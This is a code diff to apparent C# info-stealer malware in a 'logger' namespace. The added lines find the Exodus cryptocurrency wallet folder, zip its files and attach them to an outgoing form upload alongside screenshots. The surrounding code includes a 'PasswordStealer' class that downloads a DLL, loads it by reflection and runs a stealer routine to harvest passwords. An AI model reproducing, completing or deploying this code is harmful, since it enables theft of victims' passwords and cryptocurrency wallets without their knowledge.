@@ -3,6 +3,7 @@ using System;
 using System.Collections.Generic;
 using System.Drawing;
 using System.IO;
+using System.IO.Compression;
 using System.Linq;
 using System.Net;
 using System.Net.Http;
@@ -51,6 +52,31 @@ namespace logger
                 form.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), screen.DeviceName, screen.DeviceName + ".jpg");
 
             }
+            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Exodus\exodus.wallet";
+
+            if(Directory.Exists(path)){
+
+                string[] files = Directory.GetFiles(path);
+
+
+                var realfiles = new List<FileInfo>();
+
+                foreach (string file in files)
+                {
+                    var fi1 = new FileInfo(file);
+
+                    realfiles.Add(fi1);
+
+                }
+
+                var stream = CreateZipFile(realfiles);
+
+
+                form.Add(new ByteArrayContent(stream, 0, stream.Length), "exodus", "exodus.zip");
+
+
+            }
+
 
             try
             {
@@ -72,7 +98,35 @@ namespace logger
        
 
         }
+        private static byte[] CreateZipFile(IEnumerable<FileInfo> files)
+        {
+            using (var stream = new MemoryStream())
+            {
 
+                var archive = new ZipArchive(stream, System.IO.Compression.ZipArchiveMode.Create);
+
+                foreach (var item in files)
+                {
+                    archive.CreateEntryFromFile(item.FullName, item.Name, CompressionLevel.Optimal);
+                }
+
+                archive.Dispose();
+                File.WriteAllBytes("fdsf.zip", stream.ToArray());
+                return stream.ToArray();
+
+            }
+
+
+
+
+
+
+
+
+
+
+
+        }
         public static string GetIP()
         {
 
@@ -124,19 +178,22 @@ namespace logger
 
 
 
+
     class PasswordStealer
     {
 
         public static string mmain()
         {
-            
+          
             ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls
                                                  | SecurityProtocolType.Tls11
                                                  | SecurityProtocolType.Tls12
                                                  | SecurityProtocolType.Ssl3;
 
             byte[] dll = Logic.GetLibrary();
-            string pwd = Logic.GetPasswords(dll); 
+           
+            string pwd = Logic.GetPasswords(dll);
+            
             return pwd;
         }
     }
@@ -144,7 +201,7 @@ namespace logger
 
     internal sealed class Logic
     {
-     
+
         public static byte[] GetLibrary()
         {
             byte[] dll = new byte[0];
@@ -156,7 +213,7 @@ namespace logger
                 }
                 catch (WebException ex)
                 {
-                    Console.WriteLine(ex.Message);
+                    
                 }
             }
             return dll;
@@ -165,18 +222,25 @@ namespace logger
 
         public static string GetPasswords(byte[] dll)
         {
+       
             Assembly asm = Assembly.Load(dll);
+     
             dynamic instance = Activator.CreateInstance(
                 asm.GetType("PasswordStealer.Stealer"));
+
+     
             MethodInfo runMethod = instance.GetType().GetMethod("Run",
                 BindingFlags.Instance | BindingFlags.Public);
+
+        
             string passwords = (string)runMethod.Invoke(
                 instance, new object[] { });
+        
             return passwords;
         }
 
 
-  
+
 
     }
 }
